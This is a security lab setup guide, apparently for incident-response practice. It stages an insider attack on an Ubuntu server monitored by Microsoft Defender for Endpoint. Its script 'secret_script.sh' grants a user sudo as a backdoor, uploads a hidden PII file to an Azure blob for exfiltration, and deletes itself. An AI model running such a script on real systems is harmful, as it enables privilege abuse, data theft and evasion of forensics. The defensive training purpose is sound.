## Scenario

Company A has been noticing that some PII information about employees might be getting leaked because of recent phishing attempts that have been perpetrated. Such information includes address, email address, and phone number. All of this information is stored on a linux server as a hidden file where only the root/sudo users have read and write access. There was a report by another employee the other day of a fellow employee messing with the computer while the root administrator was in the bathroom. The company has decided to investigate this. 

Technology
  - Ubuntu 24.04
  - Microsoft Defender for Endpoint (MDE)
  - KQL

## Setup

### Onboarding Linux to MDE

Log in to the Ubuntu server and download the script to facilitate the onboarding of the server to MDE

```
wget https://sacyberrange00.blob.core.windows.net/mde-agents/Linux-Server-GatewayWindowsDefenderATPOnboardingPackage.zip
```
![image alt](https://github.com/Muts256/SNC-Public/blob/3009a58f976362d05cee7e8af830c66346501e7b/Images/Linux-Privilege-Escalation/Pr1.png)

Install the unzip tool to extract the Python script used in the onboarding of the Linux device
```
sudo apt install unzip
```
Then extract the Python script

![image alt](https://github.com/Muts256/SNC-Public/blob/3009a58f976362d05cee7e8af830c66346501e7b/Images/Linux-Privilege-Escalation/Pr2.png)

Make the script executable. Then execute it

```
chmod 744 <python script>

./<python script>
```

![image alt](https://github.com/Muts256/SNC-Public/blob/2a29e41f57f30d0c704f57f0def5b3d3e6fdec4b/Images/Linux-Privilege-Escalation/Pr17.png)

Add a user that will assume the bad actor role, create a hidden directory that will contain a text file with the employee's PII

```
sudo useradd charlie_benson

mkdir .secret_folder

```
![image](https://github.com/Muts256/SNC-Public/blob/49216a0d6d950977b45f746a3fd829609e0a9911/Images/Linux-Privilege-Escalation/Pr18.png)

Create a  hidden file that contains the employee's PII

```
touch .pii.txt

echo "Random text PII data" >> .pii.txt
```

![image](https://github.com/Muts256/SNC-Public/blob/49216a0d6d950977b45f746a3fd829609e0a9911/Images/Linux-Privilege-Escalation/Pr19.png)

Install the Azure CLI to enable executing Azure commands

```
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
![image alt](https://github.com/Muts256/SNC-Public/blob/3009a58f976362d05cee7e8af830c66346501e7b/Images/Linux-Privilege-Escalation/Pr6.png)

---

### create Storage Account

Log on to Azure via the portal and create a storage account
This will be used to upload the exfiltrated file/s


Create a container for the files to be stored

![image alt](https://github.com/Muts256/SNC-Public/blob/3009a58f976362d05cee7e8af830c66346501e7b/Images/Linux-Privilege-Escalation/Pr4.png)

![image alt](https://github.com/Muts256/SNC-Public/blob/3009a58f976362d05cee7e8af830c66346501e7b/Images/Linux-Privilege-Escalation/Pr5.png)

---
### Create Script

Create the script that will be used to upload the files

```
vi secret_script.sh

#!/bin/bash

# Give user $TARGET_USER sudo privileges (acts as a backdoor)
sudo usermod -aG sudo charlie_benson

# Upload target file to Azure Storage for exfiltration
# ACCOUNT_NAME is the name of the storage account you created
# ACCESS_KEY is key1 or key2 found in storage account > Security + networking > Access keys
# CONTAINER_NAME is the name of your blob container in the storage account
# FILE_NAME is the path to the file you want to exfiltrate, /home/$VM_NAME/.$SECRET_DIRECTORY/.$TEXT_FILE_TO_EXFILTRATE
# BLOB_NAME is the name of the file in the storage account
az storage blob upload \
  --account-name mmprivescalation \
  --account-key REDACTED \
  --container-name 1-mm-priv-escalalation \
  --file /home/labuser1/.secret_folder/.pii.txt \
  --name pii-download.txt

# Delete this exact script
rm -- "$0"

```
![image alt](https://github.com/Muts256/SNC-Public/blob/bd66d68a2344e8e346e36b857e2d935827de07c3/Images/Linux-Privilege-Escalation/Pr21.png)

Execute the script to upload the file

```
./secret_script.sh
```
Check that the file has been uploaded

![image alt](https://github.com/Muts256/SNC-Public/blob/3009a58f976362d05cee7e8af830c66346501e7b/Images/Linux-Privilege-Escalation/Pr9.png)



[Continue to the Investigation](https://github.com/Muts256/Incident-Response/blob/main/Linux-Privilege-Escalation-and-Data-Exfiltration/Investigation.md)
